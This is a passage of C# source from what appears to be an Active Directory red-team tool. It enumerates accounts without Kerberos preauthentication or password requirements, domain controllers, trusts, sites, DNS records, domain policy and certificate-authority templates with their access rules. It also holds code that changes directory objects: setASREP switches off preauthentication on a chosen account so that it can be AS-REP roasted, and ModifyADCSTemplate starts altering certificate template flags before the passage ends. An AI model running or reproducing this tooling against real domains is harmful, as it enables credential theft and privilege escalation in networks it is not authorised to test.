            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate accounts..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void getASREPAccounts(String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // ASREP filter
            ds.Filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();
                Console.WriteLine("\n[?] Found " + oObject.Count + " object(s) that do not require Kerberos preauthentication..");

                // Account details
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        ResultPropertyCollection omProps = sr.Properties;

                        Console.WriteLine("\n[*] SamAccountName           : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName        : " + omProps["distinguishedName"][0].ToString());
                        UInt32 iDelegateCount = 0;
                        foreach (Object oColl in omProps["msds-allowedtodelegateto"])
                        {
                            if (iDelegateCount == 0)
                            {
                                Console.WriteLine("    msDS-AllowedToDelegateTo : " + oColl);
                            }
                            else
                            {
                                Console.WriteLine("                               " + oColl);
                            }
                            iDelegateCount += 1;
                        }
                        Console.WriteLine("    userAccountControl       : " + (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to enumerate DirectoryEntry properties..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate accounts..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void getPassNotReqdAccounts(String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // ASREP filter
            ds.Filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();
                Console.WriteLine("\n[?] Found " + oObject.Count + " object(s) that do not require a password..");

                // Account details
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        ResultPropertyCollection omProps = sr.Properties;

                        Console.WriteLine("\n[*] SamAccountName           : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName        : " + omProps["distinguishedName"][0].ToString());

                        long lastPwdSet = 0;
                        try
                        {
                            lastPwdSet = (long)omProps["pwdlastset"][0];
                        }
                        catch { }

                        if (lastPwdSet == long.MaxValue)
                        {
                            Console.WriteLine("    PwdLastSet               : 0x7FFFFFFFFFFFFFFF");
                        }
                        else if (lastPwdSet == 0)
                        {
                            Console.WriteLine("    PwdLastSet               : 0x0");
                        }
                        else
                        {
                            Console.WriteLine("    PwdLastSet               : " + DateTime.FromFileTimeUtc((long)omProps["pwdlastset"][0]) + " UTC");
                        }

                        try
                        {
                            long logonTimestamp = (long)omProps["lastlogon"][0];
                            if (logonTimestamp == long.MaxValue)
                            {
                                Console.WriteLine("    lastlogon                : 0x7FFFFFFFFFFFFFFF");
                            }
                            else if (logonTimestamp == 0)
                            {
                                Console.WriteLine("    lastlogon                : 0x0");
                            }
                            else
                            {
                                Console.WriteLine("    lastlogon                : " + DateTime.FromFileTimeUtc((long)omProps["lastlogon"][0]) + " UTC");
                            }
                        }
                        catch
                        {
                            try
                            {
                                long logonTimestamp = (long)omProps["lastlogontimestamp"][0];
                                if (logonTimestamp == long.MaxValue)
                                {
                                    Console.WriteLine("    lastlogontimestamp       : 0x7FFFFFFFFFFFFFFF");
                                }
                                else if (logonTimestamp == 0)
                                {
                                    Console.WriteLine("    lastlogontimestamp       : 0x0");
                                }
                                else
                                {
                                    Console.WriteLine("    lastlogontimestamp       : " + DateTime.FromFileTimeUtc((long)omProps["lastlogontimestamp"][0]) + " UTC");
                                }
                            }
                            catch
                            {
                                Console.WriteLine("    lastlogontimestamp       : N/A");
                            }
                        }

                        UInt32 iDelegateCount = 0;
                        foreach (Object oColl in omProps["msds-allowedtodelegateto"])
                        {
                            if (iDelegateCount == 0)
                            {
                                Console.WriteLine("    msDS-AllowedToDelegateTo : " + oColl);
                            }
                            else
                            {
                                Console.WriteLine("                               " + oColl);
                            }
                            iDelegateCount += 1;
                        }
                        Console.WriteLine("    userAccountControl       : " + (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to enumerate DirectoryEntry properties..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate accounts..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void setASREP(String sObject, Boolean sRemove = false, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = sObject;

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("[!] Object not found..");
                    return;
                }
                else if (oObject.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Account details
                foreach (SearchResult sr in oObject)
                {
                    try
                    {
                        DirectoryEntry mde = sr.GetDirectoryEntry();
                        Console.WriteLine("[?] Object   : " + mde.Name);
                        Console.WriteLine("    Path     : " + mde.Path);

                        ResultPropertyCollection omProps = sr.Properties;

                        hStandIn.USER_ACCOUNT_CONTROL accountProps;
                        try
                        {
                            accountProps = (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0];
                        } catch
                        {
                            Console.WriteLine("[!] Failed to get userAccountControl property..");
                            return;
                        }

                        Console.WriteLine("\n[*] SamAccountName           : " + omProps["samAccountName"][0].ToString());
                        Console.WriteLine("    DistinguishedName        : " + omProps["distinguishedName"][0].ToString());
                        Console.WriteLine("    userAccountControl       : " + (hStandIn.USER_ACCOUNT_CONTROL)omProps["useraccountcontrol"][0]);

                        // Check if the current flags have DONT_REQUIRE_PREAUTH
                        Boolean hasASREP = (Boolean)((accountProps & hStandIn.USER_ACCOUNT_CONTROL.DONT_REQUIRE_PREAUTH) != 0);
                        if (hasASREP && !sRemove)
                        {
                            Console.WriteLine("\n[!] userAccountControl flags already contains DONT_REQUIRE_PREAUTH..");
                            return;
                        } else if (hasASREP && sRemove)
                        {
                            mde.Properties["useraccountcontrol"].Value = accountProps & ~hStandIn.USER_ACCOUNT_CONTROL.DONT_REQUIRE_PREAUTH;
                        } else if (!hasASREP && !sRemove)
                        {
                            mde.Properties["useraccountcontrol"].Value = accountProps | hStandIn.USER_ACCOUNT_CONTROL.DONT_REQUIRE_PREAUTH;
                        } else
                        {
                            Console.WriteLine("\n[!] userAccountControl flags do not contain DONT_REQUIRE_PREAUTH..");
                            return;
                        }

                        Console.WriteLine("\n[+] Updating userAccountControl..");
                        mde.CommitChanges();
                        Console.WriteLine("    |_ Success");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Failed to update userAccountControl flags..");
                        if (ex.InnerException != null)
                        {
                            Console.WriteLine("    |_ " + ex.InnerException.Message);
                        }
                        else
                        {
                            Console.WriteLine("    |_ " + ex.Message);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate accounts..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void GetADDomainControllers()
        {
            try
            {
                Domain oDom = Domain.GetComputerDomain();
                String sPDC = oDom.PdcRoleOwner.Name;
                String sDomName = oDom.Name;
                Console.WriteLine("\n[?] Using DC    : " + sPDC);
                Console.WriteLine("    |_ Domain   : " + sDomName);

                DomainControllerCollection aDCCol = oDom.DomainControllers;
                foreach (DomainController dc in aDCCol)
                {
                    Console.WriteLine("\n[*] Host                  : " + dc.Name);
                    Console.WriteLine("    Domain                : " + dc.Domain);
                    Console.WriteLine("    Forest                : " + dc.Forest);
                    Console.WriteLine("    SiteName              : " + dc.SiteName);
                    Console.WriteLine("    IP                    : " + dc.IPAddress);
                    Console.WriteLine("    OSVersion             : " + dc.OSVersion);
                    Console.WriteLine("    Local System Time UTC : " + dc.CurrentTime.ToUniversalTime().ToString("dddd, dd MMMM yyyy HH:mm:ss"));
                    try
                    {
                        UInt32 iRoleCount = 0;
                        foreach (ActiveDirectoryRole role in dc.Roles)
                        {
                            if (iRoleCount == 0)
                            {
                                Console.WriteLine("    Role                  : " + role.ToString());
                            } else
                            {
                                Console.WriteLine("                            " + role.ToString());
                            }
                            iRoleCount += 1;
                        }
                    }
                    catch
                    {
                        Console.WriteLine("    Role                  : N/A");
                    }
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to contact the current domain..");
            }
        }

         public static void GetADTrustRelationships()
         {
             try
             {
                 Domain oDom = Domain.GetComputerDomain();
                 String sPDC = oDom.PdcRoleOwner.Name;
                 String sDomName = oDom.Name;
                 Console.WriteLine("\n[?] Using DC    : " + sPDC);
                 Console.WriteLine("    |_ Domain   : " + sDomName);
         
                 TrustRelationshipInformationCollection  trustsCollection = oDom.GetAllTrustRelationships();
         
                 if (trustsCollection.Count < 1){
                     Console.WriteLine("\n[!] No trust relationships to display..");
                 } else {
                     foreach (TrustRelationshipInformation trust in trustsCollection)
                     {
                         Console.WriteLine("\n[>] Source         : " + trust.SourceName);
                         Console.WriteLine("    Target         : " + trust.TargetName);
                         Console.WriteLine("    TrustDirection : " + trust.TrustDirection);
                         Console.WriteLine("    TrustType      : " + trust.TrustType);
                     }
                 }
             }
             catch
             {
                 Console.WriteLine("[!] Failed to contact the current domain..");
             }
         }

        public static void GetADSites()
        {
            try
            {
                Domain oDom = Domain.GetComputerDomain();
                String sPDC = oDom.PdcRoleOwner.Name;
                String sDomName = oDom.Name;
                Console.WriteLine("\n[?] Using DC    : " + sPDC);
                Console.WriteLine("    |_ Domain   : " + sDomName);

                ReadOnlySiteCollection sitesCollection = oDom.Forest.Sites;

                if (sitesCollection.Count < 1)
                {
                    Console.WriteLine("\n[!] No site to display..");
                }
                else
                {
                    foreach (ActiveDirectorySite site in sitesCollection)
                    {
                        Console.WriteLine("\n[*] Site Name : " + site.Name);
                        if (site.Domains.Count > 0)
                        {
                            Console.WriteLine("    Domains                      ");
                            foreach (Domain domain in site.Domains)
                            {
                                Console.WriteLine("    |_  " + domain.Name);
                            }
                        }
                        if (site.Subnets.Count > 0)
                        {
                            Console.WriteLine("    Subnets                      ");
                            foreach (ActiveDirectorySubnet subnet in site.Subnets)
                            {
                                Console.WriteLine("    |_  " + subnet);
                            }
                        }

                        if (!String.IsNullOrEmpty(site.Location))
                        {
                            Console.WriteLine("    Location                     : " + site.Location);
                        }

                        Console.WriteLine("    Number of server in the site : " + site.Servers.Count);

                        if (site.Servers.Count > 0)
                        {
                            Console.WriteLine("    Servers                      ");

                            foreach (DirectoryServer server in site.Servers)
                            {
                                Console.WriteLine("    |_ " + server);
                            }
                        }
                    }
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to contact the current domain..");
            }
        }

        public static void StringToUserOrSID(String sUserId, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            String sUserSam = String.Empty;
            String sUserSID = String.Empty;

            // Search filter
            ds.Filter = "samaccountname=" + sUserId;
            try
            {
                SearchResultCollection oObject = ds.FindAll();
                if (oObject.Count == 1)
                {

                } else
                {
                    ds.Filter = "objectsid=" + sUserId;
                    oObject = ds.FindAll();
                    if (oObject.Count == 1)
                    {

                    }
                    else
                    {
                        Console.WriteLine("[!] User identity not found..");
                        return;
                    }
                }

                foreach (SearchResult sr in oObject)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);
                    ResultPropertyCollection omProps = sr.Properties;

                    sUserSID = new SecurityIdentifier((Byte[])omProps["objectsid"][0], 0).ToString();
                    MatchCollection mc = Regex.Matches(mde.Path, @"DC=(\w+)");
                    foreach (Match m in mc)
                    {
                        if (String.IsNullOrEmpty(sUserSam))
                        {
                            sUserSam += (m.Groups[1].Value).ToUpper();
                        } else
                        {
                            sUserSam += "." + (m.Groups[1].Value).ToUpper();
                        }
                    }

                    sUserSam += "\\" + omProps["samaccountname"][0];

                    Console.WriteLine("\n[+] User     : " + sUserSam);
                    Console.WriteLine("    SID      : " + sUserSID);
                }
            } catch
            {
                Console.WriteLine("[!] Failed to identify user..");
                return;
            }
        }

        public static void AdiDNSDump(String sFilter, String sDomain = "", String sUser = "", String sPass = "", Boolean bLegacy = false, Boolean bForest = false, UInt32 iLimit = 0)
        {
            try
            {
                DirectoryEntry rootdse = null;
                DirectoryEntry defNC = null;
                String sUserDomain = String.Empty;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    rootdse = new DirectoryEntry("LDAP://RootDSE", sUserDomain, sPass);
                }
                else
                {
                    rootdse = new DirectoryEntry("LDAP://RootDSE");
                }

                // Build path
                String sDomRoot = rootdse.Properties["defaultNamingContext"].Value.ToString();
                String sForestRoot = rootdse.Properties["rootDomainNamingContext"].Value.ToString();
                String sSearchBase = String.Empty;
                MatchCollection mc = Regex.Matches(sDomRoot, @"DC=(\w+)");
                foreach (Match m in mc)
                {
                    if (String.IsNullOrEmpty(sSearchBase))
                    {
                        sSearchBase += "DC=" + (m.Groups[1].Value);
                    }
                    else
                    {
                        sSearchBase += "." + (m.Groups[1].Value);
                    }
                }

                if (!bLegacy && !bForest)
                {
                    sSearchBase += ",CN=MicrosoftDNS,DC=DomainDnsZones," + sDomRoot;
                } else
                {
                    if (bLegacy)
                    {
                        sSearchBase += ",CN=MicrosoftDNS,CN=System," + sDomRoot;
                    } else
                    {
                        sSearchBase += ",CN=MicrosoftDNS,DC=ForestDnsZones," + sForestRoot;
                    }
                }

                // Search details
                if (iLimit == 0)
                {
                    // If unspecified == 50
                    iLimit = 50;
                }

                Console.WriteLine("\n[+] Search Base  : LDAP://" + sSearchBase);
                Console.WriteLine("[?] Result limit : " + iLimit);
                
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
                }
                else
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase);
                }

                // Search
                DirectorySearcher ds = new DirectorySearcher(defNC);
                ds.SearchScope = System.DirectoryServices.SearchScope.OneLevel;
                ds.PropertiesToLoad.Add("name");
                ds.PropertiesToLoad.Add("dnsRecord");
                if (!String.IsNullOrEmpty(sFilter))
                {
                    ds.Filter = String.Format("(&(objectClass=*)(name=*)(dnsRecord=*)(|(name=*{0}*)(name={0}*)(name=*{0})))", sFilter);
                } else
                {
                    ds.Filter = "(&(objectClass=*)(name=*)(dnsRecord=*))";
                }
                SearchResultCollection src = ds.FindAll();

                foreach (SearchResult sr in src)
                {
                    Console.WriteLine("\n[+] Object : " + sr.Properties["name"][0].ToString());
                    hStandIn.ReadDNSObject((Byte[])sr.Properties["dnsRecord"][0]);

                    // Should we exit?
                    iLimit -= 1;
                    if (iLimit == 0)
                    {
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate DNS data..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void getDomainPolicy(String sFilter, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            if (String.IsNullOrEmpty(sFilter))
            {
                ds.Filter = "(&(displayName=Default Domain Policy)(gpcfilesyspath=*))";
            }
            else
            {
                ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sFilter);
            }

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();
                if (oObject.Count == 0)
                {
                    Console.WriteLine("[!] LDAP search did not return any results..");
                    return;
                }

                SearchResult sr = oObject[0];
                DirectoryEntry mde = sr.GetDirectoryEntry();
                ResultPropertyCollection omProps = sr.Properties;

                Console.WriteLine("\n[?] Object      : " + mde.Name);
                Console.WriteLine("    Path        : " + mde.Path);
                String sPolicyRoot = omProps["gpcfilesyspath"][0].ToString();
                Console.WriteLine("    Policy Root : " + sPolicyRoot);

                // retrieve object properties
                if (!Directory.Exists(sPolicyRoot))
                {
                    Console.WriteLine("\n[!] GPO path not found..");
                    return;
                }

                // Check/create relevant path
                if (!Directory.Exists(sPolicyRoot + @"\Machine\Microsoft\Windows NT\SecEdit\"))
                {
                    Console.WriteLine("\n[!] SecEdit folder not found..");
                    return;
                }

                if (File.Exists(sPolicyRoot + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"))
                {
                    try
                    {
                        String sTmpl = File.ReadAllText(sPolicyRoot + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf");
                        Console.WriteLine("\n[+] Domain Policy");

                        List<String> propList = new List<String>(new String[] { "MinimumPasswordAge", "MaximumPasswordAge", "MinimumPasswordLength", "PasswordComplexity", "PasswordHistorySize", "LockoutBadCount", "ResetLockoutCount", "LockoutDuration", "LSAAnonymousNameLookup", "MaxTicketAge", "MaxServiceAge", "MaxRenewAge" });

                        UInt32 iResCount = 0;
                        foreach (String sProp in propList)
                        {
                            Match ma = Regex.Match(sTmpl, sProp + @"\s=\s(.+)");
                            if (ma.Success)
                            {
                                iResCount += 1;
                                if (sProp == "MaxTicketAge")
                                {
                                    Console.WriteLine("    |_ Kerberos max User ticket lifetime : " + ma.Groups[1].Value);
                                } else if (sProp == "MaxServiceAge")
                                {
                                    Console.WriteLine("    |_ Kerberos max Service ticket lifetime : " + ma.Groups[1].Value);
                                } else if (sProp == "MaxRenewAge")
                                {
                                    Console.WriteLine("    |_ Kerberos max User ticket renewal lifetime : " + ma.Groups[1].Value);
                                } else
                                {
                                    Console.WriteLine("    |_ " + sProp + " : " + ma.Groups[1].Value);
                                }
                            }
                        }
                        if (iResCount == 0)
                        {
                            Console.WriteLine("\n[!] No properties found, are you sure this is the correct GPO..");
                            return;
                        }
                    } catch
                    {
                        Console.WriteLine("\n[!] Unable to parse GptTmpl..");
                        return;
                    }
                } else
                {
                    Console.WriteLine("\n[!] GptTmpl not found..");
                    return;
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to enumerate domain policy..");
                return;
            }
        }

        public static void GetADCSTemplates(String sFilter = "", String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                DirectoryEntry rootdse = null;
                DirectoryEntry defNC = null;
                String sUserDomain = String.Empty;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    rootdse = new DirectoryEntry("LDAP://RootDSE", sUserDomain, sPass);
                }
                else
                {
                    rootdse = new DirectoryEntry("LDAP://RootDSE");
                }

                // Build path
                String sNamingContext = rootdse.Properties["configurationNamingContext"].Value.ToString();

                String sSearchBase = String.Empty;
                sSearchBase += "CN=Enrollment Services,CN=Public Key Services,CN=Services," + sNamingContext;
                
                Console.WriteLine("\n[+] Search Base  : LDAP://" + sSearchBase);
                
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
                }
                else
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase);
                }
                
                // Search
                DirectorySearcher ds = new DirectorySearcher(defNC);
                ds.Filter = "(objectCategory=pKIEnrollmentService)";
                SearchResultCollection src = ds.FindAll();
                
                foreach (SearchResult sr in src)
                {
                    String sCA = sr.Properties["name"][0].ToString();
                    Console.WriteLine("\n[>] Certificate Authority  : " + sCA);
                    Console.WriteLine("    |_ DNS Hostname        : " + sr.Properties["dNSHostName"][0].ToString());
                    Console.WriteLine("    |_ Cert DN             : " + sr.Properties["cACertificateDN"][0].ToString());
                    Console.WriteLine("    |_ GUID                : " + new Guid((Byte[])sr.Properties["objectGUID"][0]).ToString());
                    if (sr.Properties.Contains("certificateTemplates"))
                    {
                        var aTemplates = sr.Properties["certificateTemplates"];
                        List<String> lTemplates = new List<string>();
                        if (aTemplates.Count > 0)
                        {
                            // Print published templates
                            for (int i = 0; i < aTemplates.Count; i++)
                            {
                                if (i == 0)
                                {
                                    Console.WriteLine("    |_ Published Templates : " + aTemplates[i].ToString());
                                }
                                else
                                {
                                    Console.WriteLine("                             " + aTemplates[i].ToString());
                                }

                                lTemplates.Add(aTemplates[i].ToString());
                            }

                            // Search for all published templates by this CA
                            sSearchBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services," + sNamingContext;
                            if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                            {
                                defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
                            }
                            else
                            {
                                defNC = new DirectoryEntry("LDAP://" + sSearchBase);
                            }

                            ds = new DirectorySearcher(defNC);
                            if (String.IsNullOrEmpty(sFilter))
                            {
                                ds.Filter = "(objectclass=pKICertificateTemplate)";
                            } else
                            {
                                ds.Filter = String.Format("(&(objectclass=pKICertificateTemplate)(|(name=*{0}*)(name={0}*)(name=*{0})))", sFilter);
                            }
                            
                            src = ds.FindAll();

                            foreach (SearchResult srt in src)
                            {
                                // Is this a template that belongs to the CA?
                                String sName = srt.Properties["name"][0].ToString();
                                if (lTemplates.Contains(srt.Properties["name"][0].ToString()))
                                {
                                    Console.WriteLine("\n[>] Publishing CA          : " + sCA);
                                    Console.WriteLine("    |_ Template            : " + srt.Properties["name"][0].ToString());
                                    if (srt.Properties.Contains("mspki-template-schema-version"))
                                    {
                                        Console.WriteLine("    |_ Schema Version      : " + srt.Properties["mspki-template-schema-version"][0].ToString());
                                    }
                                    if (srt.Properties.Contains("pKIExpirationPeriod"))
                                    {
                                        Console.WriteLine("    |_ pKIExpirationPeriod : " + hStandIn.ConvertPKIPeriod((byte[])srt.Properties["pKIExpirationPeriod"][0]));
                                    }
                                    if (srt.Properties.Contains("pKIOverlapPeriod"))
                                    {
                                        Console.WriteLine("    |_ pKIOverlapPeriod    : " + hStandIn.ConvertPKIPeriod((byte[])srt.Properties["pKIOverlapPeriod"][0]));
                                    }
                                    if (srt.Properties.Contains("mspki-enrollment-flag"))
                                    {
                                        Console.WriteLine("    |_ Enroll Flags        : " + (hStandIn.msPKIEnrollmentFlag)Convert.ToInt32(srt.Properties["mspki-enrollment-flag"][0].ToString()));
                                    }
                                    if (srt.Properties.Contains("mspki-certificate-name-flag"))
                                    {
                                        Console.WriteLine("    |_ Name Flags          : " + (hStandIn.msPKICertificateNameFlag)Convert.ToInt32(srt.Properties["mspki-certificate-name-flag"][0].ToString()));
                                    }
                                    if (srt.Properties.Contains("pKIExtendedKeyUsage"))
                                    {
                                        var EKUs = srt.Properties["pKIExtendedKeyUsage"];
                                        if (EKUs.Count > 0)
                                        {
                                            for (int e = 0; e < EKUs.Count; e++)
                                            {
                                                if (e == 0)
                                                {
                                                    Console.WriteLine("    |_ pKIExtendedKeyUsage : " + (new Oid(srt.Properties["pKIExtendedKeyUsage"][e].ToString())).FriendlyName);
                                                } else
                                                {
                                                    Console.WriteLine("    |                        " + (new Oid(srt.Properties["pKIExtendedKeyUsage"][e].ToString())).FriendlyName);
                                                }
                                            }
                                        }
                                    }

                                    // Get Object permissions
                                    DirectoryEntry mde = srt.GetDirectoryEntry();
                                    Console.WriteLine("    |_ Owner               : " + mde.ObjectSecurity.GetOwner(typeof(NTAccount)).ToString());
                                    AuthorizationRuleCollection arc = mde.ObjectSecurity.GetAccessRules(true, true, typeof(NTAccount));
                                    foreach (ActiveDirectoryAccessRule ar in arc)
                                    {
                                        Console.WriteLine("    |_ Permission Identity : " + ar.IdentityReference.Value);
                                        Console.WriteLine("    |  |_ Type             : " + ar.AccessControlType.ToString());
                                        Console.WriteLine("    |  |_ Permission       : " + ar.ActiveDirectoryRights.ToString());
                                        if (ar.ObjectType.ToString() == "00000000-0000-0000-0000-000000000000")
                                        {
                                            Console.WriteLine("    |  |_ Object           : ANY");
                                        }
                                        else
                                        {
                                            String sSchemaFriendlyName = hStandIn.schemaGUIDToFriendlyName(ar.ObjectType, sDomain, sUser, sPass);
                                            if (String.IsNullOrEmpty(sSchemaFriendlyName))
                                            {
                                                String sRightsFriendlyName = hStandIn.rightsGUIDToFriendlyName(ar.ObjectType, sDomain, sUser, sPass);
                                                if (String.IsNullOrEmpty(sRightsFriendlyName))
                                                {
                                                    Console.WriteLine("    |  |_ Object           : " + ar.ObjectType.ToString());
                                                }
                                                else
                                                {
                                                    Console.WriteLine("    |  |_ Object           : " + sRightsFriendlyName);
                                                }
                                            }
                                            else
                                            {
                                                Console.WriteLine("    |  |_ Object           : " + sSchemaFriendlyName);
                                            }
                                        }
                                    }

                                    if (srt.Properties.Contains("whenCreated"))
                                    {
                                        Console.WriteLine("    |_ Created             : " + srt.Properties["whenCreated"][0].ToString());
                                    }
                                    if (srt.Properties.Contains("whenChanged"))
                                    {
                                        Console.WriteLine("    |_ Modified            : " + srt.Properties["whenChanged"][0].ToString());
                                    }
                                }
                            }

                        } else
                        {
                            Console.WriteLine("    |_ Published Templates : None");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to enumerate ADCS data..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void ModifyADCSTemplate(String sFilter, Boolean bEKU, Boolean bNameFalg, Boolean bEnrollFlag, Boolean bRemove, String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                DirectoryEntry rootdse = null;
                DirectoryEntry defNC = null;
                String sUserDomain = String.Empty;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    rootdse = new DirectoryEntry("LDAP://RootDSE", sUserDomain, sPass);
                }
                else
                {
                    rootdse = new DirectoryEntry("LDAP://RootDSE");
                }

                // Build path
                String sNamingContext = rootdse.Properties["configurationNamingContext"].Value.ToString();

                String sSearchBase = String.Empty;
                sSearchBase += "CN=Enrollment Services,CN=Public Key Services,CN=Services," + sNamingContext;

                Console.WriteLine("\n[+] Search Base  : LDAP://" + sSearchBase);

                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
                }
                else
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase);
                }

                // Search
                DirectorySearcher ds = new DirectorySearcher(defNC);
                ds.Filter = "(objectCategory=pKIEnrollmentService)";
                SearchResultCollection src = ds.FindAll();

                foreach (SearchResult sr in src)
                {
                    String sCA = sr.Properties["name"][0].ToString();
                    if (sr.Properties.Contains("certificateTemplates"))
                    {
                        var aTemplates = sr.Properties["certificateTemplates"];
                        List<String> lTemplates = new List<string>();
                        if (aTemplates.Count > 0)
                        {
                            // Print published templates
                            for (int i = 0; i < aTemplates.Count; i++)
                            {
                                lTemplates.Add(aTemplates[i].ToString());
                            }

                            // Search for all published templates by this CA
                            sSearchBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services," + sNamingContext;
                            if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                            {
